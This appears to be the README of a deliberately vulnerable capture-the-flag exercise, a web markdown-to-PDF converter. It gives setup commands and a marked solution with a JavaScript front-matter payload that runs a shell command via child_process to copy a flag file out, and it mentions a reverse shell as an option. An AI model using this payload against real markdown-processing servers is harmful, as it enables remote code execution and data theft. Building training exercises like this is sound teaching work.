# Exploitable Markdown

Exploitable web-based markdown to pdf converter

## Details

Markdown is a text-centric markup format, aimed to provide a quick and low-overhead way to format documents. Markdown natively supports embedded HTML tags, which sometimes include script tags. Converting unsanitized markdown is thus unsafe in a server context because of the possibility of remote code execution.

This project is an example of an exploitable server.

## Usage

### Start the server

Manually on your machine

```bash
make intsall
make flag
make run
```

Or in a container

```bash
docker build -t exploitable-markdown .
docker run -it --rm -p80:80 exploitable-markdown
```

### Exploit the server

> **IMPORTANT**: This is the solution, do not read if you'd like to attempt yourself!

1. Load the webpage: http://localhost:80
2. Insert the payload and submit:

```js
---js
(require("child_process").execSync("cat flag.txt > public/flag.txt"))
---
```

This will output the contents of the flag to the public directory which can be queried. Optionally you may also get a reverse shell and do the traversal manually, the options are open.

3. Get the flag

```bash
curl http://localhost:80/flag.txt
```
